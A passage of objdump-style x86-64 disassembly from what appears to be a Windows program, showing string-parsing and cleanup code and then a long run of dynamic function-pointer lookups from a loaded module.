   1400042c0:	85 c0                	test   %eax,%eax
   1400042c2:	75 05                	jne    0x1400042c9
   1400042c4:	41 ff c6             	inc    %r14d
   1400042c7:	eb 5e                	jmp    0x140004327
   1400042c9:	41 b8 09 00 00 00    	mov    $0x9,%r8d
   1400042cf:	48 8d 15 4a 9c 02 00 	lea    0x29c4a(%rip),%rdx        # 0x14002df20
   1400042d6:	48 8d 4e 12          	lea    0x12(%rsi),%rcx
   1400042da:	e8 01 18 01 00       	call   0x140015ae0
   1400042df:	85 c0                	test   %eax,%eax
   1400042e1:	75 44                	jne    0x140004327
   1400042e3:	0f b6 46 1b          	movzbl 0x1b(%rsi),%eax
   1400042e7:	48 8d 4e 1b          	lea    0x1b(%rsi),%rcx
   1400042eb:	84 c0                	test   %al,%al
   1400042ed:	74 0b                	je     0x1400042fa
   1400042ef:	3c 3d                	cmp    $0x3d,%al
   1400042f1:	74 04                	je     0x1400042f7
   1400042f3:	3c 20                	cmp    $0x20,%al
   1400042f5:	75 30                	jne    0x140004327
   1400042f7:	48 ff c1             	inc    %rcx
   1400042fa:	48 85 c9             	test   %rcx,%rcx
   1400042fd:	74 28                	je     0x140004327
   1400042ff:	44 38 29             	cmp    %r13b,(%rcx)
   140004302:	74 23                	je     0x140004327
   140004304:	33 d2                	xor    %edx,%edx
   140004306:	c7 43 0c 01 00 00 00 	movl   $0x1,0xc(%rbx)
   14000430d:	44 8d 42 0a          	lea    0xa(%rdx),%r8d
   140004311:	e8 ce 33 01 00       	call   0x1400176e4
   140004316:	89 43 10             	mov    %eax,0x10(%rbx)
   140004319:	eb 0c                	jmp    0x140004327
   14000431b:	ff 43 08             	incl   0x8(%rbx)
   14000431e:	eb 07                	jmp    0x140004327
   140004320:	c7 43 04 01 00 00 00 	movl   $0x1,0x4(%rbx)
   140004327:	48 8b d6             	mov    %rsi,%rdx
   14000432a:	49 8b cf             	mov    %r15,%rcx
   14000432d:	e8 4e d7 ff ff       	call   0x140001a80
   140004332:	48 8b f0             	mov    %rax,%rsi
   140004335:	49 3b 47 10          	cmp    0x10(%r15),%rax
   140004339:	0f 82 b1 fe ff ff    	jb     0x1400041f0
   14000433f:	4c 8b 64 24 60       	mov    0x60(%rsp),%r12
   140004344:	48 63 cd             	movslq %ebp,%rcx
   140004347:	ba 08 00 00 00       	mov    $0x8,%edx
   14000434c:	e8 af 15 01 00       	call   0x140015900
   140004351:	49 63 ce             	movslq %r14d,%rcx
   140004354:	ba 08 00 00 00       	mov    $0x8,%edx
   140004359:	48 89 43 20          	mov    %rax,0x20(%rbx)
   14000435d:	e8 9e 15 01 00       	call   0x140015900
   140004362:	48 89 43 30          	mov    %rax,0x30(%rbx)
   140004366:	4c 39 6b 20          	cmp    %r13,0x20(%rbx)
   14000436a:	0f 84 7c 01 00 00    	je     0x1400044ec
   140004370:	48 85 c0             	test   %rax,%rax
   140004373:	0f 84 73 01 00 00    	je     0x1400044ec
   140004379:	49 8b 77 08          	mov    0x8(%r15),%rsi
   14000437d:	49 3b 77 10          	cmp    0x10(%r15),%rsi
   140004381:	0f 83 d5 01 00 00    	jae    0x14000455c
   140004387:	bd 30 00 00 00       	mov    $0x30,%ebp
   14000438c:	0f 1f 40 00          	nopl   0x0(%rax)
   140004390:	41 b8 02 00 00 00    	mov    $0x2,%r8d
   140004396:	48 8d 15 77 9b 02 00 	lea    0x29b77(%rip),%rdx        # 0x14002df14
   14000439d:	48 8d 4e 12          	lea    0x12(%rsi),%rcx
   1400043a1:	e8 3a 17 01 00       	call   0x140015ae0
   1400043a6:	85 c0                	test   %eax,%eax
   1400043a8:	75 25                	jne    0x1400043cf
   1400043aa:	48 63 4b 1c          	movslq 0x1c(%rbx),%rcx
   1400043ae:	48 8b 43 20          	mov    0x20(%rbx),%rax
   1400043b2:	48 8d 14 c8          	lea    (%rax,%rcx,8),%rdx
   1400043b6:	48 8d 4e 14          	lea    0x14(%rsi),%rcx
   1400043ba:	e8 21 f2 ff ff       	call   0x1400035e0
   1400043bf:	85 c0                	test   %eax,%eax
   1400043c1:	0f 88 25 01 00 00    	js     0x1400044ec
   1400043c7:	ff 43 1c             	incl   0x1c(%rbx)
   1400043ca:	e9 03 01 00 00       	jmp    0x1400044d2
   1400043cf:	41 b8 02 00 00 00    	mov    $0x2,%r8d
   1400043d5:	48 8d 15 3c 9b 02 00 	lea    0x29b3c(%rip),%rdx        # 0x14002df18
   1400043dc:	48 8d 4e 12          	lea    0x12(%rsi),%rcx
   1400043e0:	e8 fb 16 01 00       	call   0x140015ae0
   1400043e5:	85 c0                	test   %eax,%eax
   1400043e7:	0f 85 e5 00 00 00    	jne    0x1400044d2
   1400043ed:	48 63 4b 28          	movslq 0x28(%rbx),%rcx
   1400043f1:	48 8b 43 30          	mov    0x30(%rbx),%rax
   1400043f5:	48 8d 14 c8          	lea    (%rax,%rcx,8),%rdx
   1400043f9:	48 8d 4e 14          	lea    0x14(%rsi),%rcx
   1400043fd:	e8 de f1 ff ff       	call   0x1400035e0
   140004402:	85 c0                	test   %eax,%eax
   140004404:	0f 88 e2 00 00 00    	js     0x1400044ec
   14000440a:	ff 43 28             	incl   0x28(%rbx)
   14000440d:	48 8d 15 18 9b 02 00 	lea    0x29b18(%rip),%rdx        # 0x14002df2c
   140004414:	41 b8 04 00 00 00    	mov    $0x4,%r8d
   14000441a:	48 8d 4e 14          	lea    0x14(%rsi),%rcx
   14000441e:	e8 bd 16 01 00       	call   0x140015ae0
   140004423:	85 c0                	test   %eax,%eax
   140004425:	75 46                	jne    0x14000446d
   140004427:	0f b6 46 18          	movzbl 0x18(%rsi),%eax
   14000442b:	48 8d 4e 18          	lea    0x18(%rsi),%rcx
   14000442f:	84 c0                	test   %al,%al
   140004431:	74 0b                	je     0x14000443e
   140004433:	3c 3d                	cmp    $0x3d,%al
   140004435:	74 04                	je     0x14000443b
   140004437:	3c 20                	cmp    $0x20,%al
   140004439:	75 32                	jne    0x14000446d
   14000443b:	48 ff c1             	inc    %rcx
   14000443e:	48 85 c9             	test   %rcx,%rcx
   140004441:	74 2a                	je     0x14000446d
   140004443:	44 38 29             	cmp    %r13b,(%rcx)
   140004446:	75 09                	jne    0x140004451
   140004448:	c7 43 14 01 00 00 00 	movl   $0x1,0x14(%rbx)
   14000444f:	eb 1c                	jmp    0x14000446d
   140004451:	0f b6 11             	movzbl (%rcx),%edx
   140004454:	2b d5                	sub    %ebp,%edx
   140004456:	75 0a                	jne    0x140004462
   140004458:	0f b6 51 01          	movzbl 0x1(%rcx),%edx
   14000445c:	41 0f b6 c5          	movzbl %r13b,%eax
   140004460:	2b d0                	sub    %eax,%edx
   140004462:	41 8b c5             	mov    %r13d,%eax
   140004465:	85 d2                	test   %edx,%edx
   140004467:	0f 95 c0             	setne  %al
   14000446a:	89 43 14             	mov    %eax,0x14(%rbx)
   14000446d:	41 b8 03 00 00 00    	mov    $0x3,%r8d
   140004473:	48 8d 15 ba 9a 02 00 	lea    0x29aba(%rip),%rdx        # 0x14002df34
   14000447a:	48 8d 4e 14          	lea    0x14(%rsi),%rcx
   14000447e:	e8 5d 16 01 00       	call   0x140015ae0
   140004483:	85 c0                	test   %eax,%eax
   140004485:	75 4b                	jne    0x1400044d2
   140004487:	0f b6 46 17          	movzbl 0x17(%rsi),%eax
   14000448b:	48 8d 4e 17          	lea    0x17(%rsi),%rcx
   14000448f:	84 c0                	test   %al,%al
   140004491:	74 0b                	je     0x14000449e
   140004493:	3c 3d                	cmp    $0x3d,%al
   140004495:	74 04                	je     0x14000449b
   140004497:	3c 20                	cmp    $0x20,%al
   140004499:	75 37                	jne    0x1400044d2
   14000449b:	48 ff c1             	inc    %rcx
   14000449e:	48 85 c9             	test   %rcx,%rcx
   1400044a1:	74 2f                	je     0x1400044d2
   1400044a3:	44 38 29             	cmp    %r13b,(%rcx)
   1400044a6:	75 09                	jne    0x1400044b1
   1400044a8:	c7 43 18 01 00 00 00 	movl   $0x1,0x18(%rbx)
   1400044af:	eb 21                	jmp    0x1400044d2
   1400044b1:	44 0f b6 01          	movzbl (%rcx),%r8d
   1400044b5:	44 2b c5             	sub    %ebp,%r8d
   1400044b8:	75 0c                	jne    0x1400044c6
   1400044ba:	44 0f b6 41 01       	movzbl 0x1(%rcx),%r8d
   1400044bf:	41 0f b6 c5          	movzbl %r13b,%eax
   1400044c3:	44 2b c0             	sub    %eax,%r8d
   1400044c6:	41 8b c5             	mov    %r13d,%eax
   1400044c9:	45 85 c0             	test   %r8d,%r8d
   1400044cc:	0f 95 c0             	setne  %al
   1400044cf:	89 43 18             	mov    %eax,0x18(%rbx)
   1400044d2:	48 8b d6             	mov    %rsi,%rdx
   1400044d5:	49 8b cf             	mov    %r15,%rcx
   1400044d8:	e8 a3 d5 ff ff       	call   0x140001a80
   1400044dd:	48 8b f0             	mov    %rax,%rsi
   1400044e0:	49 3b 47 10          	cmp    0x10(%r15),%rax
   1400044e4:	0f 82 a6 fe ff ff    	jb     0x140004390
   1400044ea:	eb 70                	jmp    0x14000455c
   1400044ec:	8b 43 1c             	mov    0x1c(%rbx),%eax
   1400044ef:	85 c0                	test   %eax,%eax
   1400044f1:	74 25                	je     0x140004518
   1400044f3:	41 8b f5             	mov    %r13d,%esi
   1400044f6:	7e 20                	jle    0x140004518
   1400044f8:	49 8b fd             	mov    %r13,%rdi
   1400044fb:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140004500:	48 8b 4b 20          	mov    0x20(%rbx),%rcx
   140004504:	48 8b 0c 0f          	mov    (%rdi,%rcx,1),%rcx
   140004508:	e8 fb 13 01 00       	call   0x140015908
   14000450d:	ff c6                	inc    %esi
   14000450f:	48 8d 7f 08          	lea    0x8(%rdi),%rdi
   140004513:	3b 73 1c             	cmp    0x1c(%rbx),%esi
   140004516:	7c e8                	jl     0x140004500
   140004518:	48 8b 4b 20          	mov    0x20(%rbx),%rcx
   14000451c:	e8 e7 13 01 00       	call   0x140015908
   140004521:	8b 43 28             	mov    0x28(%rbx),%eax
   140004524:	85 c0                	test   %eax,%eax
   140004526:	74 20                	je     0x140004548
   140004528:	41 8b f5             	mov    %r13d,%esi
   14000452b:	7e 1b                	jle    0x140004548
   14000452d:	49 8b fd             	mov    %r13,%rdi
   140004530:	48 8b 4b 30          	mov    0x30(%rbx),%rcx
   140004534:	48 8b 0c 0f          	mov    (%rdi,%rcx,1),%rcx
   140004538:	e8 cb 13 01 00       	call   0x140015908
   14000453d:	ff c6                	inc    %esi
   14000453f:	48 8d 7f 08          	lea    0x8(%rdi),%rdi
   140004543:	3b 73 28             	cmp    0x28(%rbx),%esi
   140004546:	7c e8                	jl     0x140004530
   140004548:	48 8b 4b 30          	mov    0x30(%rbx),%rcx
   14000454c:	e8 b7 13 01 00       	call   0x140015908
   140004551:	48 8b cb             	mov    %rbx,%rcx
   140004554:	e8 af 13 01 00       	call   0x140015908
   140004559:	49 8b dd             	mov    %r13,%rbx
   14000455c:	48 8b 7c 24 58       	mov    0x58(%rsp),%rdi
   140004561:	48 8b c3             	mov    %rbx,%rax
   140004564:	48 8b 74 24 50       	mov    0x50(%rsp),%rsi
   140004569:	48 83 c4 20          	add    $0x20,%rsp
   14000456d:	41 5f                	pop    %r15
   14000456f:	41 5e                	pop    %r14
   140004571:	41 5d                	pop    %r13
   140004573:	5d                   	pop    %rbp
   140004574:	5b                   	pop    %rbx
   140004575:	c3                   	ret
   140004576:	cc                   	int3
   140004577:	cc                   	int3
   140004578:	cc                   	int3
   140004579:	cc                   	int3
   14000457a:	cc                   	int3
   14000457b:	cc                   	int3
   14000457c:	cc                   	int3
   14000457d:	cc                   	int3
   14000457e:	cc                   	int3
   14000457f:	cc                   	int3
   140004580:	40 53                	rex push %rbx
   140004582:	48 83 ec 20          	sub    $0x20,%rsp
   140004586:	48 8d 15 d3 99 02 00 	lea    0x299d3(%rip),%rdx        # 0x14002df60
   14000458d:	48 8b d9             	mov    %rcx,%rbx
   140004590:	ff 15 ba 8a 02 00    	call   *0x28aba(%rip)        # 0x14002d050
   140004596:	48 89 05 6b c7 03 00 	mov    %rax,0x3c76b(%rip)        # 0x140040d08
   14000459d:	48 85 c0             	test   %rax,%rax
   1400045a0:	75 1e                	jne    0x1400045c0
   1400045a2:	48 8d 15 c7 99 02 00 	lea    0x299c7(%rip),%rdx        # 0x14002df70
   1400045a9:	48 8d 0d e8 99 02 00 	lea    0x299e8(%rip),%rcx        # 0x14002df98
   1400045b0:	e8 ab da ff ff       	call   0x140002060
   1400045b5:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
   1400045ba:	48 83 c4 20          	add    $0x20,%rsp
   1400045be:	5b                   	pop    %rbx
   1400045bf:	c3                   	ret
   1400045c0:	48 8d 15 e1 99 02 00 	lea    0x299e1(%rip),%rdx        # 0x14002dfa8
   1400045c7:	48 8b cb             	mov    %rbx,%rcx
   1400045ca:	ff 15 80 8a 02 00    	call   *0x28a80(%rip)        # 0x14002d050
   1400045d0:	48 89 05 39 c7 03 00 	mov    %rax,0x3c739(%rip)        # 0x140040d10
   1400045d7:	48 85 c0             	test   %rax,%rax
   1400045da:	75 09                	jne    0x1400045e5
   1400045dc:	48 8d 15 d5 99 02 00 	lea    0x299d5(%rip),%rdx        # 0x14002dfb8
   1400045e3:	eb c4                	jmp    0x1400045a9
   1400045e5:	48 8d 15 fc 99 02 00 	lea    0x299fc(%rip),%rdx        # 0x14002dfe8
   1400045ec:	48 8b cb             	mov    %rbx,%rcx
   1400045ef:	ff 15 5b 8a 02 00    	call   *0x28a5b(%rip)        # 0x14002d050
   1400045f5:	48 89 05 1c c7 03 00 	mov    %rax,0x3c71c(%rip)        # 0x140040d18
   1400045fc:	48 85 c0             	test   %rax,%rax
   1400045ff:	75 09                	jne    0x14000460a
   140004601:	48 8d 15 f8 99 02 00 	lea    0x299f8(%rip),%rdx        # 0x14002e000
   140004608:	eb 9f                	jmp    0x1400045a9
   14000460a:	48 8d 15 27 9a 02 00 	lea    0x29a27(%rip),%rdx        # 0x14002e038
   140004611:	48 8b cb             	mov    %rbx,%rcx
   140004614:	ff 15 36 8a 02 00    	call   *0x28a36(%rip)        # 0x14002d050
   14000461a:	48 89 05 ff c6 03 00 	mov    %rax,0x3c6ff(%rip)        # 0x140040d20
   140004621:	48 85 c0             	test   %rax,%rax
   140004624:	75 0c                	jne    0x140004632
   140004626:	48 8d 15 1b 9a 02 00 	lea    0x29a1b(%rip),%rdx        # 0x14002e048
   14000462d:	e9 77 ff ff ff       	jmp    0x1400045a9
   140004632:	48 8d 15 37 9a 02 00 	lea    0x29a37(%rip),%rdx        # 0x14002e070
   140004639:	48 8b cb             	mov    %rbx,%rcx
   14000463c:	ff 15 0e 8a 02 00    	call   *0x28a0e(%rip)        # 0x14002d050
   140004642:	48 89 05 df c6 03 00 	mov    %rax,0x3c6df(%rip)        # 0x140040d28
   140004649:	48 85 c0             	test   %rax,%rax
   14000464c:	75 0c                	jne    0x14000465a
   14000464e:	48 8d 15 33 9a 02 00 	lea    0x29a33(%rip),%rdx        # 0x14002e088
   140004655:	e9 4f ff ff ff       	jmp    0x1400045a9
   14000465a:	48 8d 15 5f 9a 02 00 	lea    0x29a5f(%rip),%rdx        # 0x14002e0c0
   140004661:	48 8b cb             	mov    %rbx,%rcx
   140004664:	ff 15 e6 89 02 00    	call   *0x289e6(%rip)        # 0x14002d050
   14000466a:	48 89 05 bf c6 03 00 	mov    %rax,0x3c6bf(%rip)        # 0x140040d30
   140004671:	48 85 c0             	test   %rax,%rax
   140004674:	75 0c                	jne    0x140004682
   140004676:	48 8d 15 5b 9a 02 00 	lea    0x29a5b(%rip),%rdx        # 0x14002e0d8
   14000467d:	e9 27 ff ff ff       	jmp    0x1400045a9
   140004682:	48 8d 15 7f 9a 02 00 	lea    0x29a7f(%rip),%rdx        # 0x14002e108
   140004689:	48 8b cb             	mov    %rbx,%rcx
   14000468c:	ff 15 be 89 02 00    	call   *0x289be(%rip)        # 0x14002d050
   140004692:	48 89 05 9f c6 03 00 	mov    %rax,0x3c69f(%rip)        # 0x140040d38
   140004699:	48 85 c0             	test   %rax,%rax
   14000469c:	75 0c                	jne    0x1400046aa
   14000469e:	48 8d 15 7b 9a 02 00 	lea    0x29a7b(%rip),%rdx        # 0x14002e120
   1400046a5:	e9 ff fe ff ff       	jmp    0x1400045a9
   1400046aa:	48 8d 15 9f 9a 02 00 	lea    0x29a9f(%rip),%rdx        # 0x14002e150
   1400046b1:	48 8b cb             	mov    %rbx,%rcx
   1400046b4:	ff 15 96 89 02 00    	call   *0x28996(%rip)        # 0x14002d050
   1400046ba:	48 89 05 7f c6 03 00 	mov    %rax,0x3c67f(%rip)        # 0x140040d40
   1400046c1:	48 85 c0             	test   %rax,%rax
   1400046c4:	75 0c                	jne    0x1400046d2
   1400046c6:	48 8d 15 93 9a 02 00 	lea    0x29a93(%rip),%rdx        # 0x14002e160
   1400046cd:	e9 d7 fe ff ff       	jmp    0x1400045a9
   1400046d2:	48 8d 15 b7 9a 02 00 	lea    0x29ab7(%rip),%rdx        # 0x14002e190
   1400046d9:	48 8b cb             	mov    %rbx,%rcx
   1400046dc:	ff 15 6e 89 02 00    	call   *0x2896e(%rip)        # 0x14002d050
   1400046e2:	48 89 05 5f c6 03 00 	mov    %rax,0x3c65f(%rip)        # 0x140040d48
   1400046e9:	48 85 c0             	test   %rax,%rax
   1400046ec:	75 0c                	jne    0x1400046fa
   1400046ee:	48 8d 15 bb 9a 02 00 	lea    0x29abb(%rip),%rdx        # 0x14002e1b0
   1400046f5:	e9 af fe ff ff       	jmp    0x1400045a9
   1400046fa:	48 8d 15 e7 9a 02 00 	lea    0x29ae7(%rip),%rdx        # 0x14002e1e8
   140004701:	48 8b cb             	mov    %rbx,%rcx
   140004704:	ff 15 46 89 02 00    	call   *0x28946(%rip)        # 0x14002d050
   14000470a:	48 89 05 3f c6 03 00 	mov    %rax,0x3c63f(%rip)        # 0x140040d50
   140004711:	48 85 c0             	test   %rax,%rax
   140004714:	75 0c                	jne    0x140004722
   140004716:	48 8d 15 db 9a 02 00 	lea    0x29adb(%rip),%rdx        # 0x14002e1f8
   14000471d:	e9 87 fe ff ff       	jmp    0x1400045a9
   140004722:	48 8d 15 ff 9a 02 00 	lea    0x29aff(%rip),%rdx        # 0x14002e228
   140004729:	48 8b cb             	mov    %rbx,%rcx
   14000472c:	ff 15 1e 89 02 00    	call   *0x2891e(%rip)        # 0x14002d050
   140004732:	48 89 05 1f c6 03 00 	mov    %rax,0x3c61f(%rip)        # 0x140040d58
   140004739:	48 85 c0             	test   %rax,%rax
   14000473c:	75 0c                	jne    0x14000474a
   14000473e:	48 8d 15 fb 9a 02 00 	lea    0x29afb(%rip),%rdx        # 0x14002e240
   140004745:	e9 5f fe ff ff       	jmp    0x1400045a9
   14000474a:	48 8d 15 27 9b 02 00 	lea    0x29b27(%rip),%rdx        # 0x14002e278
   140004751:	48 8b cb             	mov    %rbx,%rcx
   140004754:	ff 15 f6 88 02 00    	call   *0x288f6(%rip)        # 0x14002d050
   14000475a:	48 89 05 ff c5 03 00 	mov    %rax,0x3c5ff(%rip)        # 0x140040d60
   140004761:	48 85 c0             	test   %rax,%rax
   140004764:	75 0c                	jne    0x140004772
   140004766:	48 8d 15 23 9b 02 00 	lea    0x29b23(%rip),%rdx        # 0x14002e290
   14000476d:	e9 37 fe ff ff       	jmp    0x1400045a9
   140004772:	48 8d 15 47 9b 02 00 	lea    0x29b47(%rip),%rdx        # 0x14002e2c0
   140004779:	48 8b cb             	mov    %rbx,%rcx
   14000477c:	ff 15 ce 88 02 00    	call   *0x288ce(%rip)        # 0x14002d050
   140004782:	48 89 05 df c5 03 00 	mov    %rax,0x3c5df(%rip)        # 0x140040d68
   140004789:	48 85 c0             	test   %rax,%rax
   14000478c:	75 0c                	jne    0x14000479a
   14000478e:	48 8d 15 4b 9b 02 00 	lea    0x29b4b(%rip),%rdx        # 0x14002e2e0
   140004795:	e9 0f fe ff ff       	jmp    0x1400045a9
   14000479a:	48 8d 15 77 9b 02 00 	lea    0x29b77(%rip),%rdx        # 0x14002e318
   1400047a1:	48 8b cb             	mov    %rbx,%rcx
   1400047a4:	ff 15 a6 88 02 00    	call   *0x288a6(%rip)        # 0x14002d050
   1400047aa:	48 89 05 bf c5 03 00 	mov    %rax,0x3c5bf(%rip)        # 0x140040d70
   1400047b1:	48 85 c0             	test   %rax,%rax
   1400047b4:	75 0c                	jne    0x1400047c2
   1400047b6:	48 8d 15 6b 9b 02 00 	lea    0x29b6b(%rip),%rdx        # 0x14002e328
   1400047bd:	e9 e7 fd ff ff       	jmp    0x1400045a9
   1400047c2:	48 8d 15 87 9b 02 00 	lea    0x29b87(%rip),%rdx        # 0x14002e350
   1400047c9:	48 8b cb             	mov    %rbx,%rcx
   1400047cc:	ff 15 7e 88 02 00    	call   *0x2887e(%rip)        # 0x14002d050
   1400047d2:	48 89 05 9f c5 03 00 	mov    %rax,0x3c59f(%rip)        # 0x140040d78
   1400047d9:	48 85 c0             	test   %rax,%rax
   1400047dc:	75 0c                	jne    0x1400047ea
   1400047de:	48 8d 15 7b 9b 02 00 	lea    0x29b7b(%rip),%rdx        # 0x14002e360
   1400047e5:	e9 bf fd ff ff       	jmp    0x1400045a9
   1400047ea:	48 8d 15 97 9b 02 00 	lea    0x29b97(%rip),%rdx        # 0x14002e388
   1400047f1:	48 8b cb             	mov    %rbx,%rcx
   1400047f4:	ff 15 56 88 02 00    	call   *0x28856(%rip)        # 0x14002d050
   1400047fa:	48 89 05 7f c5 03 00 	mov    %rax,0x3c57f(%rip)        # 0x140040d80
   140004801:	48 85 c0             	test   %rax,%rax
   140004804:	75 0c                	jne    0x140004812
   140004806:	48 8d 15 9b 9b 02 00 	lea    0x29b9b(%rip),%rdx        # 0x14002e3a8
   14000480d:	e9 97 fd ff ff       	jmp    0x1400045a9
   140004812:	48 8d 15 c7 9b 02 00 	lea    0x29bc7(%rip),%rdx        # 0x14002e3e0
   140004819:	48 8b cb             	mov    %rbx,%rcx
   14000481c:	ff 15 2e 88 02 00    	call   *0x2882e(%rip)        # 0x14002d050
   140004822:	48 89 05 5f c5 03 00 	mov    %rax,0x3c55f(%rip)        # 0x140040d88
   140004829:	48 85 c0             	test   %rax,%rax
   14000482c:	75 0c                	jne    0x14000483a
   14000482e:	48 8d 15 bb 9b 02 00 	lea    0x29bbb(%rip),%rdx        # 0x14002e3f0
   140004835:	e9 6f fd ff ff       	jmp    0x1400045a9
   14000483a:	48 8d 15 df 9b 02 00 	lea    0x29bdf(%rip),%rdx        # 0x14002e420
   140004841:	48 8b cb             	mov    %rbx,%rcx
   140004844:	ff 15 06 88 02 00    	call   *0x28806(%rip)        # 0x14002d050
   14000484a:	48 89 05 3f c5 03 00 	mov    %rax,0x3c53f(%rip)        # 0x140040d90
   140004851:	48 85 c0             	test   %rax,%rax
   140004854:	75 0c                	jne    0x140004862
   140004856:	48 8d 15 d3 9b 02 00 	lea    0x29bd3(%rip),%rdx        # 0x14002e430
   14000485d:	e9 47 fd ff ff       	jmp    0x1400045a9
   140004862:	48 8d 15 ef 9b 02 00 	lea    0x29bef(%rip),%rdx        # 0x14002e458
   140004869:	48 8b cb             	mov    %rbx,%rcx
   14000486c:	ff 15 de 87 02 00    	call   *0x287de(%rip)        # 0x14002d050
   140004872:	48 89 05 1f c5 03 00 	mov    %rax,0x3c51f(%rip)        # 0x140040d98
   140004879:	48 85 c0             	test   %rax,%rax
   14000487c:	75 0c                	jne    0x14000488a
   14000487e:	48 8d 15 e3 9b 02 00 	lea    0x29be3(%rip),%rdx        # 0x14002e468
   140004885:	e9 1f fd ff ff       	jmp    0x1400045a9
   14000488a:	48 8d 15 07 9c 02 00 	lea    0x29c07(%rip),%rdx        # 0x14002e498
   140004891:	48 8b cb             	mov    %rbx,%rcx
   140004894:	ff 15 b6 87 02 00    	call   *0x287b6(%rip)        # 0x14002d050
   14000489a:	48 89 05 ff c4 03 00 	mov    %rax,0x3c4ff(%rip)        # 0x140040da0
   1400048a1:	48 85 c0             	test   %rax,%rax
   1400048a4:	75 0c                	jne    0x1400048b2
   1400048a6:	48 8d 15 fb 9b 02 00 	lea    0x29bfb(%rip),%rdx        # 0x14002e4a8
   1400048ad:	e9 f7 fc ff ff       	jmp    0x1400045a9
   1400048b2:	48 8d 15 1f 9c 02 00 	lea    0x29c1f(%rip),%rdx        # 0x14002e4d8
   1400048b9:	48 8b cb             	mov    %rbx,%rcx
   1400048bc:	ff 15 8e 87 02 00    	call   *0x2878e(%rip)        # 0x14002d050
   1400048c2:	48 89 05 df c4 03 00 	mov    %rax,0x3c4df(%rip)        # 0x140040da8
   1400048c9:	48 85 c0             	test   %rax,%rax
   1400048cc:	75 0c                	jne    0x1400048da
   1400048ce:	48 8d 15 1b 9c 02 00 	lea    0x29c1b(%rip),%rdx        # 0x14002e4f0
   1400048d5:	e9 cf fc ff ff       	jmp    0x1400045a9
   1400048da:	48 8d 15 3f 9c 02 00 	lea    0x29c3f(%rip),%rdx        # 0x14002e520
   1400048e1:	48 8b cb             	mov    %rbx,%rcx
   1400048e4:	ff 15 66 87 02 00    	call   *0x28766(%rip)        # 0x14002d050
   1400048ea:	48 89 05 bf c4 03 00 	mov    %rax,0x3c4bf(%rip)        # 0x140040db0
   1400048f1:	48 85 c0             	test   %rax,%rax
   1400048f4:	75 0c                	jne    0x140004902
   1400048f6:	48 8d 15 3b 9c 02 00 	lea    0x29c3b(%rip),%rdx        # 0x14002e538
   1400048fd:	e9 a7 fc ff ff       	jmp    0x1400045a9
   140004902:	48 8d 15 67 9c 02 00 	lea    0x29c67(%rip),%rdx        # 0x14002e570
   140004909:	48 8b cb             	mov    %rbx,%rcx
   14000490c:	ff 15 3e 87 02 00    	call   *0x2873e(%rip)        # 0x14002d050
   140004912:	48 89 05 9f c4 03 00 	mov    %rax,0x3c49f(%rip)        # 0x140040db8
   140004919:	48 85 c0             	test   %rax,%rax
   14000491c:	75 0c                	jne    0x14000492a
   14000491e:	48 8d 15 63 9c 02 00 	lea    0x29c63(%rip),%rdx        # 0x14002e588
   140004925:	e9 7f fc ff ff       	jmp    0x1400045a9
   14000492a:	48 8d 15 8f 9c 02 00 	lea    0x29c8f(%rip),%rdx        # 0x14002e5c0
   140004931:	48 8b cb             	mov    %rbx,%rcx
   140004934:	ff 15 16 87 02 00    	call   *0x28716(%rip)        # 0x14002d050
   14000493a:	48 89 05 7f c4 03 00 	mov    %rax,0x3c47f(%rip)        # 0x140040dc0
   140004941:	48 85 c0             	test   %rax,%rax
   140004944:	75 0c                	jne    0x140004952
   140004946:	48 8d 15 83 9c 02 00 	lea    0x29c83(%rip),%rdx        # 0x14002e5d0
   14000494d:	e9 57 fc ff ff       	jmp    0x1400045a9
   140004952:	48 8d 15 a7 9c 02 00 	lea    0x29ca7(%rip),%rdx        # 0x14002e600
   140004959:	48 8b cb             	mov    %rbx,%rcx
   14000495c:	ff 15 ee 86 02 00    	call   *0x286ee(%rip)        # 0x14002d050
   140004962:	48 89 05 5f c4 03 00 	mov    %rax,0x3c45f(%rip)        # 0x140040dc8
   140004969:	48 85 c0             	test   %rax,%rax
   14000496c:	75 0c                	jne    0x14000497a
   14000496e:	48 8d 15 ab 9c 02 00 	lea    0x29cab(%rip),%rdx        # 0x14002e620
   140004975:	e9 2f fc ff ff       	jmp    0x1400045a9
   14000497a:	48 8d 15 df 9c 02 00 	lea    0x29cdf(%rip),%rdx        # 0x14002e660
   140004981:	48 8b cb             	mov    %rbx,%rcx
   140004984:	ff 15 c6 86 02 00    	call   *0x286c6(%rip)        # 0x14002d050
   14000498a:	48 89 05 3f c4 03 00 	mov    %rax,0x3c43f(%rip)        # 0x140040dd0
   140004991:	48 85 c0             	test   %rax,%rax
   140004994:	75 0c                	jne    0x1400049a2
   140004996:	48 8d 15 d3 9c 02 00 	lea    0x29cd3(%rip),%rdx        # 0x14002e670
   14000499d:	e9 07 fc ff ff       	jmp    0x1400045a9
   1400049a2:	48 8d 15 f7 9c 02 00 	lea    0x29cf7(%rip),%rdx        # 0x14002e6a0
   1400049a9:	48 8b cb             	mov    %rbx,%rcx
   1400049ac:	ff 15 9e 86 02 00    	call   *0x2869e(%rip)        # 0x14002d050
   1400049b2:	48 89 05 1f c4 03 00 	mov    %rax,0x3c41f(%rip)        # 0x140040dd8
   1400049b9:	48 85 c0             	test   %rax,%rax
   1400049bc:	75 0c                	jne    0x1400049ca
   1400049be:	48 8d 15 f3 9c 02 00 	lea    0x29cf3(%rip),%rdx        # 0x14002e6b8
   1400049c5:	e9 df fb ff ff       	jmp    0x1400045a9
   1400049ca:	48 8d 15 17 9d 02 00 	lea    0x29d17(%rip),%rdx        # 0x14002e6e8
   1400049d1:	48 8b cb             	mov    %rbx,%rcx
   1400049d4:	ff 15 76 86 02 00    	call   *0x28676(%rip)        # 0x14002d050
   1400049da:	48 89 05 ff c3 03 00 	mov    %rax,0x3c3ff(%rip)        # 0x140040de0
   1400049e1:	48 85 c0             	test   %rax,%rax
   1400049e4:	75 0c                	jne    0x1400049f2
   1400049e6:	48 8d 15 13 9d 02 00 	lea    0x29d13(%rip),%rdx        # 0x14002e700
   1400049ed:	e9 b7 fb ff ff       	jmp    0x1400045a9
   1400049f2:	48 8d 15 3f 9d 02 00 	lea    0x29d3f(%rip),%rdx        # 0x14002e738
   1400049f9:	48 8b cb             	mov    %rbx,%rcx
   1400049fc:	ff 15 4e 86 02 00    	call   *0x2864e(%rip)        # 0x14002d050
   140004a02:	48 89 05 df c3 03 00 	mov    %rax,0x3c3df(%rip)        # 0x140040de8
   140004a09:	48 85 c0             	test   %rax,%rax
   140004a0c:	75 0c                	jne    0x140004a1a
